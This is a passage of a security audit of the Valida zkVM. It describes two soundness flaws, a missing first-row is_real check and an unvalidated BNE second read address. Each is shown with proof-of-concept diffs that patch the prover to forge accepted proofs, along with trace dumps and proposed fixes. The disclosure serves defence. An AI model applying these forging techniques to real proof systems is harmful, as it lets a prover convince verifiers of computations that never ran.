CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, opcode_hi28: 6, opcode_lo4: 4, operands: Operands([2013265909, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4084, value: Word([3, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }

Main trace for Chip: Memory
--------------------------------------------------------------------------------
Memory row 0: MemoryCols { addr: 4084, addr_bytes: Word([244, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 2, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 1: MemoryCols { addr: 4084, addr_bytes: Word([244, 15, 0, 0]), value: Word([3, 0, 0, 0]), clk: 2, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 2: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 1, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 3: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 1, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 4: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 2, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 5: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 0, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 6: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 0, diff_bytes: Word([2, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 2, diff_inv: 1006632961, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 7: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 2, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 1, diff_inv: 1, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
```

```rs
 
basic-api/src/machine/basic.rs
Original file line number	Diff line number	Diff line change
@@ -1,6 +1,7 @@
#![feature(trait_upcasting)]
use core::marker::PhantomData;

use std::borrow::BorrowMut;
use std::fs::File;
use std::io::Write;
use std::ops::RangeInclusive;
@@ -41,6 +42,7 @@ use valida_bus::{
    MachineWithRangeBus8,
};
use valida_bytes::{BytesChip, BytesTable, MachineWithBytesChip, MachineWithRangeCheckeru8};
use valida_cpu::columns::CpuCols;
use valida_cpu::{
    BeqInstruction, BneInstruction, CpuChip, FailInstruction, Imm32Instruction, JalInstruction,
    JalvInstruction, Load32Instruction, LoadFpInstruction, LoadS8Instruction, LoadU8Instruction,
@@ -1545,6 +1547,9 @@ impl<F: StarkField> Machine<F> for BasicMachine<F> {
        // A STOP instruction signals the end of the program
        if opcode == <StopInstruction as Instruction<Self, F>>::OPCODE {
            StoppingFlag::DidStop
        } else if opcode == <Add32Instruction as Instruction<Self, F>>::OPCODE {
            StoppingFlag::DidStop
            // StoppingFlag::DidNotStop
        } else if opcode == <FailInstruction as Instruction<Self, F>>::OPCODE {
            StoppingFlag::DidFail
        } else if state.machine.current_trace_height() >= state.machine.max_trace_height() {
		
		
 
basic-api/tests/test_prover.rs
Original file line number	Diff line number	Diff line change
@@ -47,6 +47,35 @@ use valida_machine::__internal::p3_commit::ExtensionMmcs;
mod common;
use common::*;

fn add_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let mut program = vec![];

    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 1, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, 2, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-12, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <Sub32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-12, -12, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);

    program
}

fn div_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let mut program = vec![];

@@ -1043,6 +1072,13 @@ fn expected_sdiv_memory_state(memory_backend: &ValidaMemoryBackend) {
    );
}

#[test]
fn prove_small_add() {
    let program = add_program::<BabyBear>();
    let (_machine, _memory_backend) = prove_program(program, ProgramTableType::Public);
    assert!(false, "Verification should fail.");
}

#[test]
fn prove_sdiv() {
    let program = sdiv_program::<BabyBear>();
```

# Finding 4: Missing first-row is_real check enables execution bypass

Currently, the CPU chip does not check whether the `is_real` column of the first row is set to 1. Consequently, the malicious prover can generate a valid proof without executing the program at all.

A working PoC is available: https://github.com/Koukyosyumei/valida-vm/tree/poc_first_is_read_can_be_zero

Run with:

```bash
cd basic-api/tests/
cargo test prove_target --release
```

This PoC comments out the entire execution loop while setting the appropriate values to `pc`, `fp`, and `is_last_segment` to bypass the boundary constraints:

```rust
        let mut final_stop_flag = StoppingFlag::DidStop;

        /*
        let mut step_did_stop = StoppingFlag::DidNotStop;
        loop {
            let pc = state.machine.cpu().pc;
	@@ -781,7 +784,7 @@ impl<F: StarkField> Machine<F> for BasicMachine<F> {
                final_stop_flag = step_did_stop;
                break;
            }
        }*/
```

```rust
        // Generate main traces.
        let t_main_traces = start_timer!(|| "valida >machine.prove(..) | main_traces");
        let mut main_traces = self.generate_main_traces(config, show_main, show_main_dims);
        if let Some(trace) = &mut main_traces[0] {
            let row: &mut CpuCols<F> = trace.row_mut(0).borrow_mut();
            row.fp = F::from_canonical_u16(4096);
            row.opcode_flags.is_stop = F::one();
            row.is_last_segment = F::one();
            println!("row: {:?}", row);
        }
        end_timer!(t_main_traces);
```

**Proposed Fix:**

Add the boundary check:

```rust
builder.when_first_row.assert_one(local.is_real);
```

```rs
 
basic-api/src/machine/basic.rs
Original file line number	Diff line number	Diff line change
@@ -1,6 +1,7 @@
#![feature(trait_upcasting)]
use core::marker::PhantomData;

use std::borrow::BorrowMut;
use std::fs::File;
use std::io::Write;
use std::ops::RangeInclusive;
@@ -41,6 +42,7 @@ use valida_bus::{
    MachineWithRangeBus8,
};
use valida_bytes::{BytesChip, BytesTable, MachineWithBytesChip, MachineWithRangeCheckeru8};
use valida_cpu::columns::CpuCols;
use valida_cpu::{
    BeqInstruction, BneInstruction, CpuChip, FailInstruction, Imm32Instruction, JalInstruction,
    JalvInstruction, Load32Instruction, LoadFpInstruction, LoadS8Instruction, LoadU8Instruction,
@@ -765,8 +767,9 @@ impl<F: StarkField> Machine<F> for BasicMachine<F> {
        state: &mut BasicRunningMachine<F>,
        metrics: &mut Self::Metrics,
    ) -> (ValidaSegmentInstanceData, Vec<u8>) {
        let mut final_stop_flag = StoppingFlag::DidNotStop;
        let mut final_stop_flag = StoppingFlag::DidStop;

        /*
        let mut step_did_stop = StoppingFlag::DidNotStop;
        loop {
            let pc = state.machine.cpu().pc;
@@ -781,7 +784,7 @@ impl<F: StarkField> Machine<F> for BasicMachine<F> {
                final_stop_flag = step_did_stop;
                break;
            }
        }
        }*/

        let log = state.machine.log_enabled();
        let (pc_init, pc_final, fp_init, fp_final) = {
@@ -1069,7 +1072,14 @@ impl<F: StarkField> Machine<F> for BasicMachine<F> {

        // Generate main traces.
        let t_main_traces = start_timer!(|| "valida >machine.prove(..) | main_traces");
        let main_traces = self.generate_main_traces(config, show_main, show_main_dims);
        let mut main_traces = self.generate_main_traces(config, show_main, show_main_dims);
        if let Some(trace) = &mut main_traces[0] {
            let row: &mut CpuCols<F> = trace.row_mut(0).borrow_mut();
            row.fp = F::from_canonical_u16(4096);
            row.opcode_flags.is_stop = F::one();
            row.is_last_segment = F::one();
            println!("row: {:?}", row);
        }
        end_timer!(t_main_traces);

        let has_main_traces = has_traces(&main_traces);
  43 changes: 43 additions & 0 deletions43  
basic-api/tests/test_prover.rs
Original file line number	Diff line number	Diff line change
@@ -47,6 +47,36 @@ use valida_machine::__internal::p3_commit::ExtensionMmcs;
mod common;
use common::*;

fn get_target_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let bytes_per_instr = BYTES_PER_INSTR as i32;

    let mut program = vec![];
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([0, 1, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 2, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, -8, 1, 0, 1]),
        },
        InstructionWord {
            opcode: <BneInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([1 * bytes_per_instr, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);

    program
}

fn div_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let mut program = vec![];

@@ -1043,6 +1073,19 @@ fn expected_sdiv_memory_state(memory_backend: &ValidaMemoryBackend) {
    );
}

// get_target_program
#[test]
fn prove_target() {
    /*
    CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
     */

    let program = get_target_program::<BabyBear>();
    let (_machine, memory_backend) = prove_program(program, ProgramTableType::Public);
    //expected_sdiv_memory_state(&memory_backend);
    assert!(false, "Verification should fail");
}

#[test]
fn prove_sdiv() {
    let program = sdiv_program::<BabyBear>();
```

# Finding 5: Control-flow can be altered because branch instructions do not validate second read address

Currently, for branch instructions such as `BNE`, the CPU chip does not check whether the `address` of the second `mem_read_channel` is equal to the second operand, even if it is NOT the immediate value.

A working PoC is available here: https://github.com/Koukyosyumei/valida-vm/tree/poc_bne_read_addr_2

Run with

```bash
cd basic-api/tests/
cargo test prove_target --release
```

This PoC considers the following program:

```rust
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([0, 1, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 2, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, -8, 1, 0, 1]),
        },
        InstructionWord {
            opcode: <BneInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([1 * bytes_per_instr, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);
```

This program is expected to produce the following traces:

```
CPU row 0: CpuCols { clk: 0, pc: 0, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([0, 1, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4096, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 1: CpuCols { clk: 1, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([2013265917, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, operands: Operands([2013265913, 2013265913, 1, 0, 1]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 1, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 3: CpuCols { clk: 3, pc: 3, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 4: CpuCols { clk: 4, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([2013265917, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 5: CpuCols { clk: 5, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, operands: Operands([2013265913, 2013265913, 1, 0, 1]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 1, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 6: CpuCols { clk: 6, pc: 3, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 7: CpuCols { clk: 7, pc: 4, fp: 4096, instruction: InstructionCols { opcode: 8, operands: Operands([0, 0, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 1, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
Main trace dimensions for Chip: CPU
```

By modifying the execution function of the `BneInstruction`:

```rust
let read_addr_2 = state.machine.cpu().fp as u32; //(state.machine.cpu().fp as i32 + ops.c()) as u32;
```

The program reads the value from an address different from the operand’s intended address, altering the state transition:

```
CPU row 0: CpuCols { clk: 0, pc: 0, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([0, 1, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4096, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 1: CpuCols { clk: 1, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([2013265917, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, operands: Operands([2013265913, 2013265913, 1, 0, 1]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 1, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 3: CpuCols { clk: 3, pc: 3, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4096, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 4: CpuCols { clk: 4, pc: 4, fp: 4096, instruction: InstructionCols { opcode: 8, operands: Operands([0, 0, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 1, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
```

```rs
mod common;
use common::*;

fn get_target_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let bytes_per_instr = BYTES_PER_INSTR as i32;

    let mut program = vec![];
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([0, 1, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 2, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, -8, 1, 0, 1]),
        },
        InstructionWord {
            opcode: <BneInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([1 * bytes_per_instr, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);

    program
}

fn div_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let mut program = vec![];

@@ -1043,6 +1073,19 @@ fn expected_sdiv_memory_state(memory_backend: &ValidaMemoryBackend) {
    );
}

// get_target_program
#[test]
fn prove_target() {
    /*
    CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 6, operands: Operands([24, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 1, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([1, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([2, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
     */

    let program = get_target_program::<BabyBear>();
    let (_machine, memory_backend) = prove_program(program, ProgramTableType::Public);
    //expected_sdiv_memory_state(&memory_backend);
    assert!(false, "Verification should fail");
}

#[test]
fn prove_sdiv() {
    let program = sdiv_program::<BabyBear>();
